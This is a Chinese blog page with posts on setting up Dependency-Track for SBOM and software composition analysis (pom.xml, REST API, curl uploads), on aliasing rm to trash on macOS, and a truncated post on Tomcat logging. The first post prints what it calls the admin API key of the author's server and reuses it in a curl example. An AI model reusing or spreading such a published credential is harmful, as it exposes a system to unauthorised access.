<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>     xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>     xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;  &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;   &lt;groupId&gt;cn.wanghw&lt;/groupId&gt;  &lt;artifactId&gt;Log4j2Scan&lt;/artifactId&gt;  &lt;version&gt;<span class="number">0.10</span>-SNAPSHOT&lt;/version&gt;   &lt;build&gt;    &lt;plugins&gt;      &lt;plugin&gt;&lt;!--         ===--&gt;        &lt;groupId&gt;org.cyclonedx&lt;/groupId&gt;        &lt;artifactId&gt;cyclonedx-maven-plugin&lt;/artifactId&gt;        &lt;version&gt;<span class="number">2.5</span><span class="number">.3</span>&lt;/version&gt;        &lt;executions&gt;          &lt;execution&gt;            &lt;phase&gt;<span class="keyword">package</span>&lt;/phase&gt;            &lt;goals&gt;              &lt;goal&gt;makeAggregateBom&lt;/goal&gt;            &lt;/goals&gt;          &lt;/execution&gt;        &lt;/executions&gt;        &lt;configuration&gt;          &lt;projectType&gt;library&lt;/projectType&gt;          &lt;schemaVersion&gt;<span class="number">1.3</span>&lt;/schemaVersion&gt;          &lt;includeBomSerialNumber&gt;<span class="keyword">true</span>&lt;/includeBomSerialNumber&gt;          &lt;includeCompileScope&gt;<span class="keyword">true</span>&lt;/includeCompileScope&gt;          &lt;includeProvidedScope&gt;<span class="keyword">true</span>&lt;/includeProvidedScope&gt;          &lt;includeRuntimeScope&gt;<span class="keyword">true</span>&lt;/includeRuntimeScope&gt;          &lt;includeSystemScope&gt;<span class="keyword">true</span>&lt;/includeSystemScope&gt;          &lt;includeTestScope&gt;<span class="keyword">false</span>&lt;/includeTestScope&gt;          &lt;includeLicenseText&gt;<span class="keyword">false</span>&lt;/includeLicenseText&gt;          &lt;outputFormat&gt;all&lt;/outputFormat&gt;          &lt;outputName&gt;bom&lt;/outputName&gt;        &lt;/configuration&gt;      &lt;/plugin&gt;&lt;!--       ===--&gt;      &lt;plugin&gt;        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;        &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt;        &lt;executions&gt;          &lt;execution&gt;            &lt;phase&gt;<span class="keyword">package</span>&lt;/phase&gt;            &lt;goals&gt;              &lt;goal&gt;shade&lt;/goal&gt;            &lt;/goals&gt;          &lt;/execution&gt;        &lt;/executions&gt;      &lt;/plugin&gt;      &lt;plugin&gt;        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;        &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;        &lt;configuration&gt;          &lt;source&gt;<span class="number">8</span>&lt;/source&gt;          &lt;target&gt;<span class="number">8</span>&lt;/target&gt;        &lt;/configuration&gt;      &lt;/plugin&gt;    &lt;/plugins&gt;  &lt;/build&gt;  &lt;dependencies&gt;    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/net.portswigger.burp.extender/burp-extender-api --&gt;    &lt;dependency&gt;      &lt;groupId&gt;net.portswigger.burp.extender&lt;/groupId&gt;      &lt;artifactId&gt;burp-extender-api&lt;/artifactId&gt;      &lt;version&gt;1.7.22&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/com.squareup.okhttp3/okhttp --&gt;    &lt;dependency&gt;      &lt;groupId&gt;com.squareup.okhttp3&lt;/groupId&gt;      &lt;artifactId&gt;okhttp&lt;/artifactId&gt;      &lt;version&gt;4.9.3&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;    &lt;dependency&gt;      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;      &lt;version&gt;1.2.78&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.cyclonedx/cyclonedx-maven-plugin --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.cyclonedx&lt;/groupId&gt;      &lt;artifactId&gt;cyclonedx-maven-plugin&lt;/artifactId&gt;      &lt;version&gt;2.5.3&lt;/version&gt;    &lt;/dependency&gt;   &lt;/dependencies&gt;&lt;/project&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="6-API支持"><a href="#6-API支持" class="headerlink" title="6.API支持"></a>6.API支持</h2><p>Rest-api：<a target="_blank" rel="noopener" href="https://docs.dependencytrack.org/integrations/rest-api/">https://docs.dependencytrack.org/integrations/rest-api/</a><br>本地Swagger UI查看 ：<br><a target="_blank" rel="noopener" href="http://xxx:8081/api/swagger.json">http://xxx:8081/api/swagger.json</a><br>1.配置apikey，admin的apikey是这个nz57wVOGnN3IDBhU5PoWFTUC9390aA68<br>后续可以自己新建team来增加api<br><img src="/2022/04/20/SCA-Dependency-track%E4%BD%BF%E7%94%A8%E7%A0%94%E7%A9%B6/wpsJCXC0f.jpg" alt="img"><br>2.使用apikey认证：<br><img src="/2022/04/20/SCA-Dependency-track%E4%BD%BF%E7%94%A8%E7%A0%94%E7%A9%B6/image-20220420092328724.png" alt="image-20220420092328724"></p>
<h2 id="7-持续集成和交付"><a href="#7-持续集成和交付" class="headerlink" title="7. 持续集成和交付"></a><strong>7.</strong> 持续集成和交付</h2><p><a target="_blank" rel="noopener" href="https://docs.dependencytrack.org/usage/cicd/">https://docs.dependencytrack.org/usage/cicd/</a></p>
<p>生成SBOM的集成环境，选择一种自己项目合适的方式去生成：</p>
<p>1、generating CycloneDX BOMs ：<a target="_blank" rel="noopener" href="https://cyclonedx.org/tool-center/">https://cyclonedx.org/tool-center/</a></p>
<p>2、Dependency-Track Jenkins Plugin ：<a target="_blank" rel="noopener" href="https://plugins.jenkins.io/dependency-track/">https://plugins.jenkins.io/dependency-track/</a></p>
<p>3、Dependency-Track GitHub Action：<a target="_blank" rel="noopener" href="https://github.com/marketplace/actions/upload-bom-to-dependency-track">https://github.com/marketplace/actions/upload-bom-to-dependency-track</a></p>
<p>4、Publish CycloneDX BOMs：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&quot;PUT&quot;</span> <span class="string">&quot;http://dtrack.example.com/api/v1/bom&quot;</span> \   -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \   -H <span class="string">&#x27;X-API-Key: LPojpCDSsEd4V9Zi6qCWr4KsiF3Konze&#x27;</span> \   -d $<span class="string">&#x27;&#123; &quot;project&quot;: &quot;f90934f5-cb88-47ce-81cb-db06fc67d4b4&quot;, &quot;bom&quot;: &quot;PD94bWwgdm...&quot; &#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -X <span class="string">&quot;POST&quot;</span> <span class="string">&quot;http://dtrack.example.com/api/v1/bom&quot;</span> \   -H <span class="string">&#x27;Content-Type: multipart/form-data&#x27;</span> \   -H <span class="string">&#x27;X-Api-Key: LPojpCDSsEd4V9Zi6qCWr4KsiF3Konze&#x27;</span> \   -F <span class="string">&quot;project=f90934f5-cb88-47ce-81cb-db06fc67d4b4&quot;</span> \   -F <span class="string">&quot;bom=&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;...&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X <span class="string">&quot;PUT&quot;</span> <span class="string">&quot;http://dtrack.example.com/api/v1/bom&quot;</span> \   -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \   -H <span class="string">&#x27;X-API-Key: LPojpCDSsEd4V9Zi6qCWr4KsiF3Konze&#x27;</span> \   -d @payload.json</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/20/SCA-Dependency-track%E4%BD%BF%E7%94%A8%E7%A0%94%E7%A9%B6/wpsIGKj0l.jpg" alt="img"> </p>
<p>如果没有uuid，可以用projectName代替，并且开启autoCreat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&quot;POST&quot;</span> <span class="string">&quot;http://dtrack.example.com/api/v1/bom&quot;</span> \   -H <span class="string">&#x27;Content-Type: multipart/form-data&#x27;</span> \   -H <span class="string">&quot;X-Api-Key: xxxxxxx&quot;</span> \   -F <span class="string">&quot;autoCreate=true&quot;</span> \   -F <span class="string">&quot;projectName=xxxx&quot;</span> \   -F <span class="string">&quot;projectVersion=xxxx&quot;</span> \   -F <span class="string">&quot;bom=@target/bom.xml&quot;</span></span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&quot;POST&quot;</span> <span class="string">&quot;http://xxxxx:8081/api/v1/bom&quot;</span> \   -H <span class="string">&#x27;Content-Type: multipart/form-data&#x27;</span> \   -H <span class="string">&quot;X-Api-Key: nz57wVOGnN3IDBhU5PoWFTUC9390aA68&quot;</span> \   -F <span class="string">&quot;autoCreate=true&quot;</span> \   -F <span class="string">&quot;projectName=test-auto-pulish&quot;</span> \   -F <span class="string">&quot;projectVersion=1.2.3.2&quot;</span> \   -F <span class="string">&quot;bom=@/Users/z0/Desktop/bom.xml&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/20/SCA-Dependency-track%E4%BD%BF%E7%94%A8%E7%A0%94%E7%A9%B6/image-20220420092220735.png" alt="image-20220420092220735"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SBOM/" rel="tag">SBOM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SCA/" rel="tag">SCA</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-设置rm防止手贱" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/04/13/%E8%AE%BE%E7%BD%AErm%E9%98%B2%E6%AD%A2%E6%89%8B%E8%B4%B1/" class="article-date">
  	<time datetime="2022-04-13T09:57:38.000Z" itemprop="datePublished">2022-04-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/04/13/%E8%AE%BE%E7%BD%AErm%E9%98%B2%E6%AD%A2%E6%89%8B%E8%B4%B1/">
        设置rm防止手贱
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>mac下用trash代替rm可以很好的防止出事</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ brew install trash</span><br><span class="line">打开~/.bash_profile文件</span><br><span class="line">添加一行<span class="built_in">alias</span> rm=<span class="string">&quot;trash -F&quot;</span></span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>

<p>参考:<a target="_blank" rel="noopener" href="https://github.com/ali-rantakari/trash">https://github.com/ali-rantakari/trash</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mac/" rel="tag">Mac</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-解决mac启动tomcat不显示日志" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/04/13/%E8%A7%A3%E5%86%B3mac%E5%90%AF%E5%8A%A8tomcat%E4%B8%8D%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97/" class="article-date">
  	<time datetime="2022-04-13T02:29:30.000Z" itemprop="datePublished">2022-04-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/04/13/%E8%A7%A3%E5%86%B3mac%E5%90%AF%E5%8A%A8tomcat%E4%B8%8D%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97/">
        解决mac启动tomcat不显示日志
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>发现mac部署了tomcat之后./start.sh没有日志输出,可以修改catalina.sh做输出</p>
<h3 id="1-修改配置文件如下"><a href="#1-修改配置文件如下" class="headerlink" title="1.修改配置文件如下"></a>1.修改配置文件如下</h3><p>修改~/Tomcat/apache-tomcat-8.5.77/bin/catalina.sh，找到&gt;&gt; “$CATALINA_OUT” 2&gt;&amp;1 &amp;在后面加入 tail -f ${CATALINA_OUT}</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment"># contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment"># this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment"># The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment"># (the &quot;License&quot;); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment"># the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"># See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"># limitations under the License.</span></span><br><span class="line"></span><br><span class="line"><span 